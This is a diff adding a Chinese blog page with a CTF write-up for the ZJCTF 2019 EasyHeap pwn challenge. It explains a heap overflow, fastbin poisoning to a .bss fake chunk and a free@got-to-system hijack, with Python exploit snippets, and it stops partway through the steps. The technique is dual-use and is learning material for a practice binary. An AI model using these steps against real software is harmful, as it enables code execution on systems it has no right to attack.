@@ -1,0 +1,803 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.36d0987006a4b9c3341e62a9e55cd9446b790bd2367575177aa5d794949c7cf0.js" integrity="sha256-NtCYcAakucM0HmKp5VzZRGt5C9I2dXUXeqXXlJScfPA=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>codex通解 - 微风的龙</title>
+    <link rel="icon" href="/favicon_hu_912579ba8553ef86.png" sizes="16x16" type="image/png">
+    <link rel="icon" href="/favicon_hu_220d0e60e04d07f1.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="/favicon_hu_e404a0b940aa1839.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_603e3ce51eff6377.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_149e475083d0f0f9.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
+<meta name="keywords" content="博客, Hugo, PWN, BUUOJ, 个人主页" />
+  <meta name="description" content="# [ZJCTF 2019] EasyHeap WP
+
+## 题目分析
+
+程序提供 3 个基本堆操作：
+
+- `create`
+- `edit`
+- `delete`
+
+保护如下：
+
+- Partial RELRO
+- Canary
+- NX
+- No PIE
+
+因为没有 PIE，所以程序内的全局变量、GOT 地址都是固定的；又因为是 Partial RELRO，所以 GOT 可写，适合做 GOT 劫持。
+
+---
+
+## 程序关键点
+
+程序里有一个全局数组 `heaparray`，地址为：
+
+```text
+heaparray = 0x6020e0
+它本质上就是一个保存堆块指针的数组，可以理解为：" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="codex通解">
+  <meta name="twitter:description" content="# [ZJCTF 2019] EasyHeap WP ## 题目分析 程序提供 3 个基本堆操作： - `create` - `edit` - `delete` 保护如下： - Partial RELRO - Canary - NX - No PIE 因为没有 PIE，所以程序内的全局变量、GOT 地址都是固定的；又因为是 Partial RELRO，所以 GOT 可写，适合做 GOT 劫持。 --- ## 程序关键点 程序里有一个全局数组 `heaparray`，地址为： ```text heaparray = 0x6020e0 它本质上就是一个保存堆块指针的数组，可以理解为：">
+<meta property="og:url" content="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-3/2-3-3/codex%E9%80%9A%E8%A7%A3/">
+  <meta property="og:site_name" content="微风的龙">
+  <meta property="og:title" content="codex通解">
+  <meta property="og:description" content="# [ZJCTF 2019] EasyHeap WP ## 题目分析 程序提供 3 个基本堆操作： - `create` - `edit` - `delete` 保护如下： - Partial RELRO - Canary - NX - No PIE 因为没有 PIE，所以程序内的全局变量、GOT 地址都是固定的；又因为是 Partial RELRO，所以 GOT 可写，适合做 GOT 劫持。 --- ## 程序关键点 程序里有一个全局数组 `heaparray`，地址为： ```text heaparray = 0x6020e0 它本质上就是一个保存堆块指针的数组，可以理解为：">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="buu">
+    <meta property="article:published_time" content="2026-04-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-17T00:00:00+00:00">
+    <meta property="article:tag" content="BUU">
+
+  <meta itemprop="name" content="codex通解">
+  <meta itemprop="description" content="# [ZJCTF 2019] EasyHeap WP ## 题目分析 程序提供 3 个基本堆操作： - `create` - `edit` - `delete` 保护如下： - Partial RELRO - Canary - NX - No PIE 因为没有 PIE，所以程序内的全局变量、GOT 地址都是固定的；又因为是 Partial RELRO，所以 GOT 可写，适合做 GOT 劫持。 --- ## 程序关键点 程序里有一个全局数组 `heaparray`，地址为： ```text heaparray = 0x6020e0 它本质上就是一个保存堆块指针的数组，可以理解为：">
+  <meta itemprop="datePublished" content="2026-04-17T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-17T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1292">
+  <meta itemprop="keywords" content="BUU">
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.db20b90f1e018f02fe452451fb9603d42007e5f5abc40cd58ddadfec0d7764f3.css" integrity="sha256-2yC5Dx4BjwL+RSRR+5YD1CAH5fWrxAzVjdrf7A13ZPM=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="https://weifengdel0ng.github.io/css/home.css" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+</head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-xxl">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://weifengdel0ng.github.io/">微风的龙
+</a>
+
+    <div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">微风的龙</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-xxl-0">
+        <hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/">首页
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/posts/">文章
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/about/">关于
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-xxl-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="搜索"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-xxl-none">配色</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="蓝色"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="蓝灰色"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="棕色"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="青色"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="绿色"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="靛青色"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="橙色"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="粉色"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="紫色"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="红色"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="蓝绿色"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="黄色"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-xxl-none">模式</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> 浅色
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> 深色
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> 自动
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.f7179afb1166ccce2102740afe4caf205dbc623896eb19a268f6cb9367e6eea6.js" integrity="sha256-9xea&#43;xFmzM4hAnQK/kyvIF28YjiW6xmiaPbLk2fm7qY=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">你的浏览器不支持 JavaScript。</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="目录">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="目录">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="版权">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="评论">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xxl-block" role="button" title="切换侧边栏">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">codex通解</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="创建于 2026-04-17 08:00:00 &#43;0800 CST。">April 17, 2026</span><span class="post-reading-time me-1 mb-1">3 分钟阅读</span><a href="/categories/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>BUU</a><a href="/tags/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">BUU</a>
+</div>
+
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">目录</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span># [ZJCTF 2019] EasyHeap WP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 题目分析
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>程序提供 3 个基本堆操作：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> <span style="color:#e6db74">`create`</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> <span style="color:#e6db74">`edit`</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> <span style="color:#e6db74">`delete`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>保护如下：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> Partial RELRO
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> Canary
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> NX
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">-</span> No PIE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>因为没有 PIE，所以程序内的全局变量、GOT 地址都是固定的；又因为是 Partial RELRO，所以 GOT 可写，适合做 GOT 劫持。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 程序关键点
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>程序里有一个全局数组 <span style="color:#e6db74">`heaparray`</span>，地址为：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>```text
+</span></span><span style="display:flex;"><span>heaparray = 0x6020e0
+</span></span></code></pre></div><p>它本质上就是一个保存堆块指针的数组，可以理解为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>heaparray[<span style="color:#ae81ff">10</span>];
+</span></span></code></pre></div><p>申请堆块时：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>heaparray[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(size);
+</span></span></code></pre></div><p>编辑堆块时：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, heaparray[i], size);
+</span></span></code></pre></div><p>删除堆块时：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(heaparray[i]);
+</span></span><span style="display:flex;"><span>heaparray[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><p>所以如果我们能改掉 <code>heaparray[i]</code> 的值，就等于控制了菜单功能实际操作的地址。</p>
+<hr>
+
+<h2 id="漏洞点" data-numberify>漏洞点<a class="anchor ms-1" href="#漏洞点"></a></h2>
+<p>漏洞在 <code>edit_heap</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Size of Heap : &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>size <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Content of heap : &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read_input</span>(heaparray[idx], size);
+</span></span></code></pre></div><p>这里的问题是：</p>
+<ul>
+<li><code>size</code> 由用户自己输入</li>
+<li>程序不会检查这个 <code>size</code> 是否超过原 chunk 实际大小
+所以存在 <strong>heap overflow</strong>，可以从当前 chunk 溢出覆盖下一个 chunk 的元数据。</li>
+</ul>
+<hr>
+
+<h2 id="为什么不走后门" data-numberify>为什么不走后门<a class="anchor ms-1" href="#为什么不走后门"></a></h2>
+<p>程序里有隐藏菜单 <code>4869</code>，会检查全局变量 <code>magic</code>，如果满足条件就进入 <code>l33t()</code>。
+但远程实际测试发现，<code>l33t()</code> 执行的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /home/pwn/flag&#34;</span>);
+</span></span></code></pre></div><p>而这台远程机器的 flag 实际在 <code>/flag</code>，所以即使打通后门，也拿不到真正的 flag。
+因此更稳妥的做法是直接构造 <strong>任意命令执行</strong>。</p>
+<hr>
+
+<h2 id="利用思路" data-numberify>利用思路<a class="anchor ms-1" href="#利用思路"></a></h2>
+<p>整体思路：</p>
+<ol>
+<li>利用 <code>edit</code> 的堆溢出改掉 fastbin 链表</li>
+<li>构造 fake chunk 到 <code>.bss</code></li>
+<li>覆盖 <code>heaparray[0]</code></li>
+<li>让 <code>heaparray[0] = free@got</code></li>
+<li>再通过 <code>edit(0, ...)</code> 把 <code>free@got</code> 改成 <code>system@plt</code></li>
+<li>把某个 chunk 的内容改成 <code>cat /flag\x00</code></li>
+<li>调用 <code>delete(idx)</code>，实际就会变成 <code>system(&quot;cat /flag&quot;)</code></li>
+</ol>
+<hr>
+
+<h2 id="关键地址" data-numberify>关键地址<a class="anchor ms-1" href="#关键地址"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>heaparray <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6020e0</span>
+</span></span><span style="display:flex;"><span>fake_chunk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6020ad</span>
+</span></span><span style="display:flex;"><span>free_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;free&#39;</span>]
+</span></span><span style="display:flex;"><span>system_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span></code></pre></div><hr>
+
+<h2 id="利用过程" data-numberify>利用过程<a class="anchor ms-1" href="#利用过程"></a></h2>
+
+<h3 id="1-申请-3-个-fastbin-chunk" data-numberify>1. 申请 3 个 fastbin chunk<a class="anchor ms-1" href="#1-申请-3-个-fastbin-chunk"></a></h3>
+<p>申请 3 个 <code>0x60</code> 大小的 chunk：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;happy&#39;</span>)    <span style="color:#75715e"># 0</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pad&#39;</span>)      <span style="color:#75715e"># 1</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;happy&#39;</span>)    <span style="color:#75715e"># 2</span>
+</span></span></code></pre></div><p>这里 <code>0x60</code> 对应的实际 chunk size 是 <code>0x70</code>，属于 fastbin。</p>
+<hr>
+
+<h3 id="2-释放-chunk2" data-numberify>2. 释放 chunk2<a class="anchor ms-1" href="#2-释放-chunk2"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
+</span></span></code></pre></div><p>这样 <code>chunk2</code> 进入 fastbin。</p>
+<hr>
+
+<h3 id="3-溢出-chunk1篡改-chunk2-的-fd" data-numberify>3. 溢出 chunk1，篡改 chunk2 的 fd<a class="anchor ms-1" href="#3-溢出-chunk1篡改-chunk2-的-fd"></a></h3>
+<p>利用 <code>edit(1, ...)</code> 溢出到已经 free 的 <code>chunk2</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x6020ad</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, len(payload), payload)
+</span></span></code></pre></div><p>这里含义是：</p>
+<ul>
+<li><code>b'A' * 0x60</code> 填满 chunk1</li>
+<li><code>p64(0)</code> 覆盖下一个 chunk 的 <code>prev_size</code></li>
+<li><code>p64(0x71)</code> 保持下一个 chunk 的 size 为合法 fastbin 大小</li>
+<li><code>p64(0x6020ad)</code> 把 <code>chunk2-&gt;fd</code> 改成 fake chunk
+此时 fastbin 链表变成：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>chunk2 -&gt; 0x6020ad
+</span></span></code></pre></div><hr>
+
+<h3 id="4-连续-malloc-两次拿到-fake-chunk" data-numberify>4. 连续 malloc 两次，拿到 fake chunk<a class="anchor ms-1" href="#4-连续-malloc-两次拿到-fake-chunk"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;happy&#39;</span>)                             <span style="color:#75715e"># 2</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x23</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;free&#39;</span>]))   <span style="color:#75715e"># 3</span>
+</span></span></code></pre></div><p>第一次 <code>malloc</code> 取回真正的 <code>chunk2</code>。<br>
+第二次 <code>malloc</code> 返回 fake chunk 对应的用户区。</p>
+<hr>
+
+<h2 id="为什么是-0x6020ad" data-numberify>为什么是 0x6020ad<a class="anchor ms-1" href="#为什么是-0x6020ad"></a></h2>
+<p><code>malloc</code> 返回的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>chunk + 0x10
+</span></span></code></pre></div><p>所以 fake chunk 的用户区起点是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0x6020ad + 0x10 = 0x6020bd
+</span></span></code></pre></div><p>而：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>heaparray = 0x6020e0
+</span></span></code></pre></div><p>两者差值：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0x6020e0 - 0x6020bd = 0x23
+</span></span></code></pre></div><p>所以：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x23</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;free&#39;</span>])
+</span></span></code></pre></div><p>的含义就是：</p>
+<ul>
+<li>前 <code>0x23</code> 字节填充</li>
+<li>后面的 <code>p64(free@got)</code> 正好写到 <code>heaparray[0]</code>
+也就是说，这一步执行完后：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>heaparray[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> free<span style="color:#a6e22e">@got</span>
+</span></span></code></pre></div><hr>
+
+<h2 id="5-劫持-freegot" data-numberify>5. 劫持 free@got<a class="anchor ms-1" href="#5-劫持-freegot"></a></h2>
+<p>既然 <code>heaparray[0]</code> 已经被改成了 <code>free@got</code>，那么：
+heaparray指向的是我们要修改内容的的地址。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;system&#39;</span>]))
+</span></span></code></pre></div><p>表面上是在编辑第 0 个堆块，实际上是在写：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free<span style="color:#a6e22e">@got</span> <span style="color:#f92672">=</span> system<span style="color:#a6e22e">@plt</span>
+</span></span></code></pre></div><p>于是后面程序中的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(ptr)
+</span></span></code></pre></div><p>都会变成：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(ptr)
+</span></span></code></pre></div><hr>
+
+<h2 id="6-把-chunk1-改成命令字符串" data-numberify>6. 把 chunk1 改成命令字符串<a class="anchor ms-1" href="#6-把-chunk1-改成命令字符串"></a></h2>
